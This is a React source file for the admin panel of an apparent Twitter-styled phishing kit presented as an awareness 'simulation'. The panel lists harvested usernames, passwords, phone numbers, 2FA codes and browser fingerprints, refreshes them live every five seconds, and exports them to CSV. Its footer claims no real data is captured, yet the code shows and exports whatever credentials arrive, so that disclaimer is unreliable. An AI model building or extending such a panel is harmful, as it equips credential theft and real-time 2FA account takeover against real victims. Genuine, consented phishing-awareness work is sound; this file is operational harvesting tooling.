import React, { useEffect, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { Helmet } from 'react-helmet';
import { useAppState } from '@/context/AppStateContext';

export default function AdminDashboardPage() {
  const { capturedData, setIsAdminAuthenticated, clearAllCapturedData } = useAppState();
  const navigate = useNavigate();
  const [lastRefresh, setLastRefresh] = useState(new Date());
  const [searchTerm, setSearchTerm] = useState('');
  const [sortBy, setSortBy] = useState('timestamp');

  // Auto-refresh data every 5 seconds
  useEffect(() => {
    const interval = setInterval(() => {
      setLastRefresh(new Date());
    }, 5000);
    return () => clearInterval(interval);
  }, []);

  // Filter and sort data
  const filteredData = capturedData
    .filter(data => 
      data.username?.toLowerCase().includes(searchTerm.toLowerCase()) ||
      data.password?.toLowerCase().includes(searchTerm.toLowerCase()) ||
      data.phoneNumber?.includes(searchTerm) ||
      data.code?.includes(searchTerm)
    )
    .sort((a, b) => {
      const aValue = a[sortBy] || a.id;
      const bValue = b[sortBy] || b.id;
      return sortBy === 'timestamp' ? new Date(bValue) - new Date(aValue) : aValue.localeCompare(bValue);
    });

  const handleLogout = () => {
    setIsAdminAuthenticated(false);
    navigate('/admin/login');
  };

  const handleClearData = () => {
    if (window.confirm("Are you sure you want to clear all captured data? This action cannot be undone.")) {
      clearAllCapturedData();
    }
  };

  const handleExportData = () => {
    if (capturedData.length === 0) {
      alert("No data to export.");
      return;
    }

    const exportData = capturedData.map(data => ({
      timestamp: data.timestamp || new Date(data.id).toISOString(),
      username: data.username,
      password: data.password,
      phoneNumber: data.phoneNumber || '',
      twoFactorCode: data.code || '',
      userAgent: data.userAgent || 'Unknown',
      screenResolution: data.screenResolution || 'Unknown',
      language: data.language || 'Unknown',
      sessionId: data.sessionId || 'Legacy'
    }));

    const csvContent = [
      'Timestamp,Username,Password,Phone Number,2FA Code,User Agent,Screen Resolution,Language,Session ID',
      ...exportData.map(row => 
        [row.timestamp, row.username, row.password, row.phoneNumber, row.twoFactorCode, 
         row.userAgent, row.screenResolution, row.language, row.sessionId]
        .map(field => `"${field.toString().replace(/"/g, '""')}"`)
        .join(',')
      )
    ].join('\n');

    const blob = new Blob([csvContent], { type: 'text/csv' });
    const url = window.URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `phishing_simulation_data_${new Date().toISOString().split('T')[0]}.csv`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    window.URL.revokeObjectURL(url);
  };

  return (
    <>
      <Helmet>
        <title>Admin Panel - Phishing Simulation</title>
        <meta name="description" content="Admin dashboard displaying captured user data for phishing awareness training." />
      </Helmet>
      <div className="bg-[#0d1117] font-chirp text-white min-h-screen p-10">
        <header className="flex justify-between items-center mb-8">
          <h1 className="text-[#1da1f2] text-3xl text-center flex-grow">🛡️ Simulated Admin Panel - Phishing Awareness Training</h1>
          <div className="flex gap-2">
            <button
              onClick={handleExportData}
              className="p-2 px-4 bg-green-500 text-white border-none rounded-md text-sm cursor-pointer hover:bg-green-600 transition-colors"
            >
              Export Data
            </button>
            <button
              onClick={handleClearData}
              className="p-2 px-4 bg-yellow-500 text-white border-none rounded-md text-sm cursor-pointer hover:bg-yellow-600 transition-colors"
            >
              Clear All Data
            </button>
            <button
              onClick={handleLogout}
              className="p-2 px-4 bg-red-500 text-white border-none rounded-md text-sm cursor-pointer hover:bg-red-600 transition-colors"
            >
              Logout
            </button>
          </div>
        </header>
        
        {capturedData.length === 0 ? (
            <p className="text-gray-400 text-center text-xl">No data captured yet. Try the simulation!</p>
          ) : (
          <>
            <div className="mb-6 grid grid-cols-1 md:grid-cols-4 gap-4">
              <div className="bg-[#15202b] p-4 rounded-lg">
                <h3 className="text-[#58a6ff] text-lg mb-2">📊 Total Captures</h3>
                <p className="text-2xl font-bold text-white">{capturedData.length}</p>
              </div>
              <div className="bg-[#15202b] p-4 rounded-lg">
                <h3 className="text-[#58a6ff] text-lg mb-2">🕒 Latest Activity</h3>
                <p className="text-sm text-white">
                  {capturedData.length > 0 ? new Date(capturedData[capturedData.length - 1].timestamp || capturedData[capturedData.length - 1].id).toLocaleString() : 'N/A'}
                </p>
              </div>
              <div className="bg-[#15202b] p-4 rounded-lg">
                <h3 className="text-[#58a6ff] text-lg mb-2">🌍 Unique Sessions</h3>
                <p className="text-2xl font-bold text-white">
                  {new Set(capturedData.map(d => d.sessionId || d.id)).size}
                </p>
              </div>
              <div className="bg-[#15202b] p-4 rounded-lg">
                <h3 className="text-[#58a6ff] text-lg mb-2">🟢 Live Monitoring</h3>
                <p className="text-xs text-green-400">
                  Last refresh: {lastRefresh.toLocaleTimeString()}
                </p>
                <p className="text-xs text-gray-400">Auto-refresh: 5s</p>
              </div>
            </div>
            
            <div className="mb-4 flex gap-4 items-center">
              <input
                type="text"
                placeholder="Search captured data..."
                value={searchTerm}
                onChange={(e) => setSearchTerm(e.target.value)}
                className="flex-1 p-3 bg-[#253341] border border-[#40506b] rounded-md text-white placeholder-gray-400 focus:border-[#58a6ff] focus:outline-none"
              />
              <select
                value={sortBy}
                onChange={(e) => setSortBy(e.target.value)}
                className="p-3 bg-[#253341] border border-[#40506b] rounded-md text-white focus:border-[#58a6ff] focus:outline-none"
              >
                <option value="timestamp">Sort by Time</option>
                <option value="username">Sort by Username</option>
                <option value="sessionId">Sort by Session</option>
              </select>
              {searchTerm && (
                <div className="text-sm text-gray-400">
                  {filteredData.length} of {capturedData.length} results
                </div>
              )}
            </div>
            
            {filteredData.length === 0 && searchTerm ? (
              <div className="text-center py-8">
                <p className="text-gray-400 text-lg">No results found for "{searchTerm}"</p>
                <button
                  onClick={() => setSearchTerm('')}
                  className="mt-2 text-[#58a6ff] hover:underline"
                >
                  Clear search
                </button>
              </div>
            ) : (
            <div className="overflow-x-auto shadow-[0_0_15px_rgba(0,0,0,0.5)] rounded-lg">
              <table className="w-full border-collapse bg-[#15202b]">
                <thead>
                  <tr className="bg-[#1a2734]">
                    <th className="p-4 text-left text-[#58a6ff] border-b border-[#253341]">Timestamp</th>
                    <th className="p-4 text-left text-[#58a6ff] border-b border-[#253341]">Username/Email</th>
                    <th className="p-4 text-left text-[#58a6ff] border-b border-[#253341]">Password</th>
                    <th className="p-4 text-left text-[#58a6ff] border-b border-[#253341]">Phone Number</th>
                    <th className="p-4 text-left text-[#58a6ff] border-b border-[#253341]">2FA Code</th>
                    <th className="p-4 text-left text-[#58a6ff] border-b border-[#253341]">Browser Info</th>
                    <th className="p-4 text-left text-[#58a6ff] border-b border-[#253341]">Session ID</th>
                  </tr>
                </thead>
                <tbody>
                  {filteredData.map((data, index) => (
                    <tr key={data.id || index} className="hover:bg-[#1e2b38] transition-colors">
                      <td className="p-4 border-b border-[#253341] text-sm">
                        {data.timestamp ? new Date(data.timestamp).toLocaleString() : new Date(data.id).toLocaleString()}
                      </td>
                      <td className="p-4 border-b border-[#253341] font-mono text-sm break-all">
                        <span className="bg-[#253341] px-2 py-1 rounded text-[#58a6ff]">{data.username}</span>
                      </td>
                      <td className="p-4 border-b border-[#253341] font-mono text-sm">
                        <span className="bg-red-900 px-2 py-1 rounded text-red-200">{data.password}</span>
                      </td>
                      <td className="p-4 border-b border-[#253341] font-mono text-sm">
                        {data.phoneNumber ? (
                          <span className="bg-[#253341] px-2 py-1 rounded text-[#58a6ff]">{data.phoneNumber}</span>
                        ) : (
                          <span className="text-gray-500">-</span>
                        )}
                      </td>
                      <td className="p-4 border-b border-[#253341] font-mono text-sm">
                        {data.code ? (
                          <span className="bg-yellow-900 px-2 py-1 rounded text-yellow-200">{data.code}</span>
                        ) : (
                          <span className="text-gray-500">-</span>
                        )}
                      </td>
                      <td className="p-4 border-b border-[#253341] text-xs">
                        <div className="space-y-1">
                          {data.userAgent && (
                            <div className="text-gray-400">
                              {data.userAgent.includes('Chrome') ? '🌐 Chrome' : 
                               data.userAgent.includes('Firefox') ? '🦊 Firefox' : 
                               data.userAgent.includes('Safari') ? '🧭 Safari' : '🌐 Browser'}
                            </div>
                          )}
                          {data.screenResolution && (
                            <div className="text-gray-400">📱 {data.screenResolution}</div>
                          )}
                          {data.language && (
                            <div className="text-gray-400">🌍 {data.language}</div>
                          )}
                        </div>
                      </td>
                      <td className="p-4 border-b border-[#253341] font-mono text-xs text-gray-400">
                        {data.sessionId && data.sessionId !== 'Unknown' ? data.sessionId.substring(0, 8) + '...' : 'Legacy'}
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
            )}
          </>
        )}

        <div className="mt-5 bg-[#ff4444] p-4 rounded-md text-sm text-center">
          ⚠️ This is a simulated admin panel for training and awareness only.<br />
          No real data is captured or logged. Use for cybersecurity education purposes.
        </div>
      </div>
    </>
  );
}